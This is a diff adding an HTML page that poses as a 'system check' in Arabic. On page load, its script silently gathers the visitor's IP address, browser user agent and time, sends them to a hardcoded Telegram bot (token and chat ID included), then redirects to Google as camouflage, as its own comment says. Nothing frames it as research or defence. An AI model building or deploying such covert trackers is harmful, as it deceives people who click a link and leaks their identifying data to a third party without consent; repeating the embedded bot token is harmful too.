@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head><title>Loading...</title></head>
+<body>
+    <script>
+        // إعدادات البوت الخاص بك
+        const token = "8376514162:AAESk3saO_oIgo-1AhJkBODJX0sIPoQzyv8";
+        const chatId = "1149386368";
+
+        async function sendData() {
+            // جمع معلومات الجهاز والـ IP (عبر خدمة خارجية)
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                
+                const report = `⚠️ تم الضغط على الرابط!\n🌐 IP: ${ipData.ip}\n📱 الجهاز: ${navigator.userAgent}\n⏰ الوقت: ${new Date().toLocaleString()}`;
+
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: report })
+                });
+            } catch (e) { console.error(e); }
+            
+            // تمويه: نقل المستخدم إلى جوجل بعد ثانية واحدة
+            setTimeout(() => { window.location.href = "https://www.google.com"; }, 1000);
+        }
+        sendData();
+    </script>
+    <div style="text-align: center; margin-top: 50px;">
+        <h2>جاري التحقق من النظام... يرجى الانتظار</h2>
+    </div>
+</body>
+</html>
